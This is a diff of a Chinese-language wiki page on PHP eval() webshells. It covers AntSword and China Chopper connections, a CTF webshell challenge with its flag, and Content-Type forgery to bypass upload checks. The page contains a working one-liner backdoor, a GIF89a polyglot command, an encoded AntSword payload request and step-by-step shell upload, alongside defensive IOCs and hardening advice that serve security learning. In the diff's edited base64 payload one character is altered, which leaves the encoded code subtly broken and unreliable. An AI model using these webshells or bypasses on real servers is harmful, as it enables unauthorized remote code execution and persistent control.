@@ -1,7 +1,8 @@
 ---
-title: PHP Webshell 基础：eval() 一句话木马原理、蚁剑连接演示与 Content-Type 绕过上传实战
-description: 系统梳理 PHP 一句话木马基于 eval() 的核心执行原理，完整演示蚁剑客户端连接流程与数据包解析，详细记录利用 Content-Type
-  伪造绕过前端上传检测的实战细节，构建 Webshell 入门实战知识体系。
+title: PHP Webshell 基础：eval() 一句话木马原理、蚁剑/菜刀连接演示与 Content-Type 绕过上传实战
+description: 系统梳理 PHP 一句话木马基于 eval() 的核心执行原理，完整演示蚁剑与中国菜刀客户端连接流程与数据包解析，详细记录利用 Content-Type
+  伪造绕过前端上传检测的实战细节，补充攻防世界 Webshell 实战案例（默认密码 shell 的 PHP 一句话木马通过中国菜刀连接获取 Flag 的完整流程），构建
+  Webshell 入门实战知识体系。
 category: program-analysis
 tags:
 - PHP
@@ -10,18 +11,21 @@ tags:
 - eval
 - 蚁剑
 - AntSword
+- 中国菜刀
+- China Chopper
 - Content-Type 绕过
 - 文件上传
 - 渗透测试
 - 后门分析
+- 攻防世界
 date: '2024-07-15'
 updated: '2026-11-14'
 ---
 ## 概述
 
-Webshell（网页后门）是攻击者在目标服务器植入的脚本文件，通过 HTTP 请求实现远程代码执行与持久化控制。PHP 环境下最经典、最基础的形态是 **基于 `eval()` 的一句话木马**。本页面围绕该核心原理，结合归档实战文章，从 **函数机制 → 后门构造 → 客户端连接演示 → 上传绕过技巧 → 防御检测** 五个维度展开，旨在为渗透测试入门、CTF Web 题目分析、应急响应溯源提供结构化知识基础。
+Webshell（网页后门）是攻击者在目标服务器植入的脚本文件，通过 HTTP 请求实现远程代码执行与持久化控制。PHP 环境下最经典、最基础的形态是 **基于 `eval()` 的一句话木马**。本页面围绕该核心原理，结合归档实战文章，从 **函数机制 → 后门构造 → 客户端连接演示（蚁剑/中国菜刀） → 上传绕过技巧 → 实战案例（攻防世界） → 防御检测** 六个维度展开，旨在为渗透测试入门、CTF Web 题目分析、应急响应溯源提供结构化知识基础。
 
-> 关联页面：[[php-webshell-fundamentals-chopper-analysis]]（中国菜刀连接流程深度解析）、[[php-webshell-obfuscation-av-evasion]]（Webshell 混淆与免杀进阶）
+> 关联页面：[[php-webshell-fundamentals-chopper-analysis]]（中国菜刀连接流程深度解析）、[[php-webshell-obfuscation-av-evasion]]（Webshell 混淆与免杀进阶）、[[attack-defense-world-beginner-web-writeup]]（攻防世界 Web 新手练习区完整解题报告）
 
 ---
 
@@ -90,7 +94,7 @@ Content-Type: application/x-www-form-urlencoded
 User-Agent: antSword/v2.1
 Connection: close
 
-cmd=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTsKQHNldF90aW1lX2xpbWl0KDApOwokZCA9IGRpcm5hbWUoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKTsKaWYgKCRkID09ICIiKSAkZCA9IGRpcm5hbWUoJF9TRVJWRVJbJ1BBVEhfVFJBTlNMQVRFRCddKTsKJHJldCA9ICIiOwokcmV0IC49ICJ7JGR9XHQiOwppZiAoc3Vic3RyKCRkLCAwLCAxKSAhPSAiLyIpIHsKICBmb3JlYWNoIChyYW5nZSgnQScsICdaJykgYXMgJGwpIHsKICAgIGlmIChpc19kaXIoIiRseTovIikpIHsKICAgICAkcmV0IC49ICIke2x9OiI7CiAgICB9CiAgfQp9IGVsc2UgewogICRyZXQgLj0gIi9cdCI7Cn0KJHJldCAuPSBw
+cmd=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTsKQHNldF90aW1lX2xpbWl0KDApOwokZCA9IGRpcm5hbWUoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKTsKaWYgKCRkID09ICIiKSAkZCA9IGRpcm5hbWUoJF9TRVJWRVJbJ1BBVEhfVFJBTlNMQVRFRCddKTsKJHJldCA9ICIiOwokcmV0IC49ICJ7JGR9XHQiOwppZiAoc3Vic3RyKCRkLCAwLCAxKSAhPSAiLyIpIHsKICBmb3JlYWNoIChyYW5nZSgnQScsICDaJykgYXMgJGwpIHsKICAgIGlmIChpc19kaXIoIiRseTovIikpIHsKICAgICAkcmV0IC49ICIke2x9OiI7CiAgICB9CiAgfQp9IGVsc2UgewogICRyZXQgLj0gIi9cdCI7Cn0KJHJldCAuPSBw
 ```
 
 #### 两次解码还原
@@ -142,7 +146,76 @@ system("whoami");
 
 ---
 
-## 三、实战绕过：Content-Type 伪造突破前端上传检测
+## 三、实战演示：中国菜刀连接全流程复现（攻防世界实战案例）
+
+### 攻防世界 Webshell 挑战场景
+
+> 来源：[[attack-defense-world-beginner-web-writeup]] 归档文章《攻防世界-答题-WEB-新手练习区》
+
+| 项目 | 详情 |
+|------|------|
+| **靶场平台** | 攻防世界 |
+| **题目分类** | Web 新手练习区 |
+| **题目名称** | webshell |
+| **提示信息** | index.php 里面有后门，采用 POST 提交，密码是 shell |
+| **后门类型** | PHP `eval()` 一句话木马 |
+| **连接工具** | **中国菜刀** |
+| **预期 Flag** | `cyberpeace{0cb63f9c0ec1d91a7f9fc9ef7cb2ce0f}` |
+
+### 后门代码分析
+
+根据题目提示，目标服务器 `index.php` 中植入的后门代码为：
+
+```php
+<?php @eval($_POST['shell']); ?>
+```
+
+- **密码参数**：`shell`（对应 `$_POST['shell']`）
+- **请求方式**：POST
+- **执行函数**：`eval()`
+
+### 中国菜刀连接配置步骤
+
+#### 打开中国菜刀主界面
+- 右键空白处 → “添加站点”
+- 或点击工具栏 “站点管理” → “添加”
+
+#### 填写连接参数
+| 字段 | 值 | 说明 |
+|------|-----|------|
+| **站点 URL** | `http://target/index.php` | 靶场提供的目标地址 |
+| **连接密码** | `shell` | 题目明文提示的密码参数名 |
+| **编码方式** | 自动/默认 | 菜刀默认使用 UTF-8 编码 |
+| **User-Agent** | 默认 | 可自定义伪装 |
+
+#### 测试连接
+- 点击 “测试连接” 按钮
+- 状态栏显示 “连接成功” → 右侧面板出现虚拟文件管理器 / 虚拟终端
+
+### 连接成功界面与 Flag 获取
+
+根据归档文章截图记录：
+
+1. **虚拟文件管理器** 显示目标服务器目录结构
+2. **虚拟终端** 可直接执行系统命令
+3. 在网站根目录或指定路径下发现 Flag 文件，或直接在终端执行 `cat flag.php` / `ls` 等命令获取
+4. **最终 Flag**：`cyberpeace{0cb63f9c0ec1d91a7f9fc9ef7cb2ce0f}`
+
+### 中国菜刀流量特征分析（对比蚁剑）
+
+| 特征维度 | 中国菜刀 | 蚁剑 |
+|----------|----------|------|
+| **编码方式** | 默认不加密/可选 Base64 | 默认 Base64 编码器 |
+| **初始化载荷** | 相似的环境探测代码 | 相似的环境探测代码 |
+| **分隔符** | `->|` 和 `|<-` 包裹输出 | 直接输出，无固定分隔符 |
+| **User-Agent** | 可自定义，默认含 "chopper" 特征 | `antSword/v2.x` |
+| **参数名** | 可配置，默认 `z0`/`z1` 等 | 与后门参数名一致（如 `cmd`） |
+
+> **溯源价值**：在流量分析中，若发现 POST 请求体含有 `->|` `|<-` 分隔符、参数名为短字符（`z0`/`z1`）、且响应体包含目录/系统/用户拼接信息，极大概率为中国菜刀连接行为。
+
+---
+
+## 四、实战绕过：Content-Type 伪造突破前端上传检测
 
 ### 漏洞成因分类
 
@@ -198,9 +271,9 @@ Content-Type: image/jpeg
 {"code":200,"msg":"上传成功","path":"/uploads/20240715/shell.php"}
 ```
 
-#### 步骤 5：蚁剑连接验证
+#### 步骤 5：蚁剑/菜刀连接验证
 - URL：`http://target/uploads/20240715/shell.php`
-- 密码：`cmd`
+- 密码：`cmd`（或 `shell` 视后门代码）
 - 连接成功 → 拿到虚拟终端
 
 > **归档文章截图佐证**：文章中展示的 Burp 修改 `Content-Type: image/jpeg` 与蚁剑连接成功界面，完整印证该绕过链路。
@@ -215,7 +288,7 @@ echo -en 'GIF89a<?php @eval($_POST["cmd"]); ?>' > shell.gif
 
 ---
 
-## 四、防御检测与加固体系
+## 五、防御检测与加固体系
 
 ### 代码层面加固
 
@@ -247,17 +320,18 @@ max_file_uploads = 5
 
 | 特征维度 | 典型 IOC |
 |----------|----------|
-| **请求头** | `User-Agent: antSword/v2.x`、`Content-Type: application/x-www-form-urlencoded` |
-| **请求体** | 单一参数（如 `cmd/c/shell`）值为**长 Base64**，解码后含 `ini_set("display_errors"`、`set_time_limit(0)`、`php_uname()` |
+| **请求头** | `User-Agent: antSword/v2.x`、`User-Agent: Chopper`、`Content-Type: application/x-www-form-urlencoded` |
+| **请求体** | 单一参数（如 `cmd/c/shell/z0`）值为**长 Base64**，解码后含 `ini_set("display_errors"`、`set_time_limit(0)`、`php_uname()` |
 | **响应体** | 含 `->|`/`|<-`（菜刀）或直接返回目录/系统信息/用户名拼接字符串 |
 | **连接频率** | 短时间内同一 IP 对同一 URL 重复 POST，且参数名固定 |
 
 ---
 
-## 五、关联知识页面交叉引用
+## 六、关联知识页面交叉引用
 
 - [[php-webshell-fundamentals-chopper-analysis]] — 中国菜刀连接流程深度解析，对比蚁剑异同
 - [[php-webshell-obfuscation-av-evasion]] — Webshell 混淆免杀进阶：算术拆分、XOR 拆分、多态生成
+- [[attack-defense-world-beginner-web-writeup]] — 攻防世界靶场 Web 新手练习区 11 道题目完整解题报告（含本 webshell 题目）
 - [[edu-src-penetration-test-case-study]] — 实战案例：文件上传绕过 Getshell → 蚁剑连接全链路复现
 - [[vulnhub-bbs-cute-102-writeup]] — CuteNews 头像上传绕过（GIF89a 头 + PHP）实战
 - [[huxiangbei-willphp-file-inclusion-writeup]] — WillPHP 任意文件包含利用 pearcmd.php 写入 Webshell
@@ -267,11 +341,11 @@ max_file_uploads = 5
 
 ---
 
-## 六、小结与持续演进
+## 七、小结与持续演进
 
-本页面构建了 **PHP `eval()` 一句话木马 → 蚁剑连接流量还原 → Content-Type 伪造上传绕过 → 防御体系** 的完整知识闭环。掌握该体系可支撑：
+本页面构建了 **PHP `eval()` 一句话木马 → 蚁剑/中国菜刀双客户端连接流量还原 → Content-Type 伪造上传绕过 → 攻防世界实战案例 → 防御体系** 的完整知识闭环。掌握该体系可支撑：
 
-1. **快速识别**：通过流量特征（Base64 载荷、初始化代码模式）定位 Webshell 连接行为
+1. **快速识别**：通过流量特征（Base64 载荷、初始化代码模式、菜刀分隔符 `->|` `|<-`）定位 Webshell 连接行为
 2. **实战复现**：在授权渗透/靶场练习中复现上传绕过 → 落地后门 → 客户端管理全链路
 3. **加固对抗**：从代码审计、PHP 配置、中间件配置、WAF 规则四层面构建纵深防御
 4. **知识迁移**：理解 `eval/assert` 代码执行本质，类比 Java `Runtime.exec()`、Python `eval/exec`、Node.js `vm.runInThisContext()` 等跨语言 Webshell 原理
@@ -279,8 +353,10 @@ max_file_uploads = 5
 > **演进提示**：
 > - PHP 8.0+ 移除 `create_function`、废弃 `assert(string)`，但 `eval` 仍存；新型管理工具（**哥斯拉 Godzilla**、**冰蝎 Behinder**）采用 **AES 加密流量 + 动态密钥协商 + 内存马**，流量特征与本页面完全不同，需单独建立知识页面跟进。
 > - 文件上传绕过已从单一 `Content-Type` 伪造演进至 **解析漏洞、条件竞争、中间件特性（Nginx `fastcgi_split_path_info`）、供应链污染** 等高阶技术，建议结合 [[race-condition-vulnerability-analysis]]、[[php-webshell-obfuscation-av-evasion]] 持续扩展。
+> - 攻防世界等 CTF 靶场的 Webshell 题目通常考察基础连接与简单绕过，实战中需结合 [[php-webshell-obfuscation-av-evasion]] 理解免杀对抗演进。
 
 ## 来源
 
 - [0x00实验室-202108-202304_042](../sources/0x00实验室-202108-202304_042.md)
 - [0x00实验室-202108-202304_053](../sources/0x00实验室-202108-202304_053.md)
+- [0x00实验室-202108-202304_081](../sources/0x00实验室-202108-202304_081.md)
